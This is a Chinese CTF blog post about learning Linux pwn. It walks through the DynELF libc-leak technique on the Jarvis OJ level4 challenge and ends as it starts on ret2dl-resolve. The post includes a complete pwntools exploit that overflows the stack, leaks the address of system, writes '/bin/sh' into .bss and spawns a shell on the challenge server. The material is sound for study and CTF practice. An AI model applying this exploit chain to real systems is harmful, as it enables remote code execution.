<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.4.2">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.2">


  <link rel="mask-icon" href="/images/logo.svg?v=6.4.2" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.4.2',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="0x00：Introduction本篇文章主要总结自己学习Linux Pwn的一些过程，记录了一些有意义的资料 0x01：Stack Attack0x00：DynELFDynELF方法适用于没有libc的情况，我们可以通过DynELF方法来实现泄露system函数的地址，那么DynELF是什么呢？在pwntools官方文档有介绍，简单而言就是通过leak方法反复进入main函数中查询libc中的内">
<meta name="keywords" content="Linux Pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux Pwn Learning">
<meta property="og:url" content="http://yoursite.com/2020/02/09/Linux-Pwn-Learning/index.html">
<meta property="og:site_name" content="Thunder_J">
<meta property="og:description" content="0x00：Introduction本篇文章主要总结自己学习Linux Pwn的一些过程，记录了一些有意义的资料 0x01：Stack Attack0x00：DynELFDynELF方法适用于没有libc的情况，我们可以通过DynELF方法来实现泄露system函数的地址，那么DynELF是什么呢？在pwntools官方文档有介绍，简单而言就是通过leak方法反复进入main函数中查询libc中的内">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/2020/02/09/Linux-Pwn-Learning/1.png">
<meta property="og:image" content="http://yoursite.com/2020/02/09/Linux-Pwn-Learning/2.png">
<meta property="og:image" content="http://yoursite.com/2020/02/09/Linux-Pwn-Learning/3.png">
<meta property="og:image" content="http://yoursite.com/2020/02/09/Linux-Pwn-Learning/4.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190416222922114.png">
<meta property="og:updated_time" content="2020-05-07T03:16:22.314Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux Pwn Learning">
<meta name="twitter:description" content="0x00：Introduction本篇文章主要总结自己学习Linux Pwn的一些过程，记录了一些有意义的资料 0x01：Stack Attack0x00：DynELFDynELF方法适用于没有libc的情况，我们可以通过DynELF方法来实现泄露system函数的地址，那么DynELF是什么呢？在pwntools官方文档有介绍，简单而言就是通过leak方法反复进入main函数中查询libc中的内">
<meta name="twitter:image" content="http://yoursite.com/2020/02/09/Linux-Pwn-Learning/1.png">



  <link rel="alternate" href="/atom.xml" title="Thunder_J" type="application/atom+xml">




  <link rel="canonical" href="http://yoursite.com/2020/02/09/Linux-Pwn-Learning/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Linux Pwn Learning | Thunder_J</title>
  











  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>
<a href="https://your-url" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Thunder_J</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">Just for fun</p>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Linux-Pwn-Learning/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Thunder_J">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Thunder_J">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Linux Pwn Learning
              
            
          </h1>
        

        <div class="post-meta">
		
		

          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2020-02-09 11:59:03" itemprop="dateCreated datePublished" datetime="2020-02-09T11:59:03+08:00">2020-02-09</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2020-05-07 11:16:22" itemprop="dateModified" datetime="2020-05-07T11:16:22+08:00">2020-05-07</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
                  ，
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             阅读次数： 
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-symbolscount">
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">本文字数：</span>
                
                <span title="本文字数">108k</span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">1:39</span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="0x00：Introduction"><a href="#0x00：Introduction" class="headerlink" title="0x00：Introduction"></a>0x00：Introduction</h1><p>本篇文章主要总结自己学习Linux Pwn的一些过程，记录了一些有意义的资料</p>
<h1 id="0x01：Stack-Attack"><a href="#0x01：Stack-Attack" class="headerlink" title="0x01：Stack Attack"></a>0x01：Stack Attack</h1><h2 id="0x00：DynELF"><a href="#0x00：DynELF" class="headerlink" title="0x00：DynELF"></a>0x00：DynELF</h2><p>DynELF方法适用于没有libc的情况，我们可以通过DynELF方法来实现泄露system函数的地址，那么DynELF是什么呢？在<a href="http://docs.pwntools.com/en/stable/dynelf.html?highlight=DynELF" target="_blank" rel="noopener">pwntools官方文档</a>有介绍，简单而言就是通过leak方法反复进入main函数中查询libc中的内容，其代码框架如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./xxx'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))) <span class="comment">#打印搜索的信息</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>)) <span class="comment">#初始化DynELF模块</span></span><br><span class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure>
<p>我们通过一道题来深入了解这个方法</p>
<h3 id="0x01：Jarvis-Oj-level4"><a href="#0x01：Jarvis-Oj-level4" class="headerlink" title="0x01：Jarvis Oj-level4"></a>0x01：Jarvis Oj-level4</h3><p><strong>题目链接</strong></p>
<p><a href="https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0</a></p>
<p><strong>解题思路</strong></p>
<p> 我们先检测一些保护机制</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  root@Thunder_J-virtual-machine:~/桌面# checksec level4</span><br><span class="line">[*] '/home/Thunder_J/\xe6\xa1\x8c\xe9\x9d\xa2/level4'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled #堆栈不可执行</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>用IDA查看一下主函数内容</p>
<p><strong>main()</strong></p>
<p>如果是做了前面level0-3的朋友应该对这里非常熟悉，逻辑非常简单，我们进vulnerable_function()函数内看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vulnerable_function()</strong></p>
<p>很明显这里出现栈溢出，read函数读取0x100的内容，双击buf可以看到buf只有0x88+0x4的大小，所以我们可以构造栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>第一次构造</strong></p>
<p>既然我们清楚是栈溢出，我们就需要多多观察程序内的信息，有没有system，’/bin/sh’等关键的内容，然而我们用IDA并没有搜索到有system或者’/bin/sh’的信息，那这里就需要用到上面提及的DynELF的方法了，我们通过objdump查看函数信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# objdump -R level4</span><br><span class="line"></span><br><span class="line">level4：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a018 R_386_JUMP_SLOT   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>我们看到有read和write函数，其实有这两个函数就代表我们可以通过他们来泄露system函数在libc中的地址了，因为我们可以通过栈溢出覆盖返回地址执行，因此我们第一次构造调用write函数泄露libc中system的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    write_plt = p32(<span class="number">0x08048340</span>)</span><br><span class="line">    fun_addr = p32(<span class="number">0x0804844b</span>)</span><br><span class="line">    payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + write_plt + fun_addr + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>) <span class="comment">#write(1, addr, 4);</span></span><br><span class="line">    r.send(payload)</span><br><span class="line">    leaked = r.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leaked</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure>
<p><strong>第二次构造</strong></p>
<p>我们在得到了system函数的地址之后就需要写入’/bin/sh’字符串了，那么去哪里写入呢？当然是.bss段，我们通过readelf的方法查看程序的.bss段：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# readelf -S level4</span><br><span class="line">There are 30 section headers, starting at offset 0x1844:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804822c 00022c 000050 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804827c 00027c 00000c 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048288 000288 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080482b0 0002b0 000020 08  AI  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        080482d0 0002d0 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048300 000300 000050 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        08048350 000350 0001c2 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        08048514 000514 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048528 000528 000017 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        08048540 000540 000034 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        08048574 000574 0000ec 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 00001c 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a01c 00101c 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a024 001024 000004 00  WA  0   0  1</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001024 000052 01  MS  0   0  1</span><br><span class="line">  [27] .shstrtab         STRTAB          00000000 001076 000106 00      0   0  1</span><br><span class="line">  [28] .symtab           SYMTAB          00000000 00117c 000450 10     29  45  4</span><br><span class="line">  [29] .strtab           STRTAB          00000000 0015cc 000276 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>
<p>根据上面的数据我们选中.bss段的地址开始第二次构造，在.bss段中写入’/bin/sh’字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data_addr = <span class="number">0x0804A024</span> <span class="comment"># readelf -S level4</span></span><br><span class="line"></span><br><span class="line">read_plt = p32(<span class="number">0x08048310</span>)</span><br><span class="line">fun_addr = p32(<span class="number">0x0804844b</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + read_plt + fun_addr + p32(<span class="number">0</span>) + p32(data_addr) + p32(<span class="number">8</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure>
<p><strong>第三次构造</strong></p>
<p>准备工作做完了当然最后一步就是getshell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(system_addr) + <span class="string">'aaaa'</span> + p32(data_addr)</span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure>
<h3 id="0x02：exp"><a href="#0x02：exp" class="headerlink" title="0x02：exp"></a>0x02：exp</h3><p>总结一下上面的步骤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9880</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    write_plt = p32(<span class="number">0x08048340</span>)</span><br><span class="line">    fun_addr = p32(<span class="number">0x0804844b</span>)</span><br><span class="line">    buf = p32(addr)</span><br><span class="line">    payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + write_plt + fun_addr + p32(<span class="number">1</span>) + buf + p32(<span class="number">4</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    leaked = r.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leaked</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"> </span><br><span class="line">data_addr = <span class="number">0x0804A024</span> <span class="comment"># readelf -S level4</span></span><br><span class="line"></span><br><span class="line">read_plt = p32(<span class="number">0x08048310</span>)</span><br><span class="line">fun_addr = p32(<span class="number">0x0804844b</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + read_plt + fun_addr + p32(<span class="number">0</span>) + p32(data_addr) + p32(<span class="number">8</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(system_addr) + <span class="string">'aaaa'</span> + p32(data_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x03：总结"><a href="#0x03：总结" class="headerlink" title="0x03：总结"></a>0x03：总结</h3><p>没有做过level0-3的建议做一下在做level4，每个题目收获都会有所不同</p>
<p><strong>参考链接</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/85129</span><br><span class="line">https://blog.csdn.net/smalosnail/article/details/53386353</span><br></pre></td></tr></table></figure>
<h2 id="0x01：Ret2dl-resovle"><a href="#0x01：Ret2dl-resovle" class="headerlink" title="0x01：Ret2dl-resovle"></a>0x01：Ret2dl-resovle</h2><p>ret2dl-resovle这种技术在pwn中的运用也挺多的，可以类比Windows下的IAT技术进行学习，了解这个技术之前，我们需要知道ELF文件中各个函数的加载过程，下面就演示一下GOT表是如何加载的，首先我们编译一个简单的程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Pwn\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"welcome\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -m32 -fno-stack-protector -no-pie -s helloworld.c</span></span><br></pre></td></tr></table></figure>
<p>我们在puts函数下一个断点，观察是如何调用这个函数的</p>
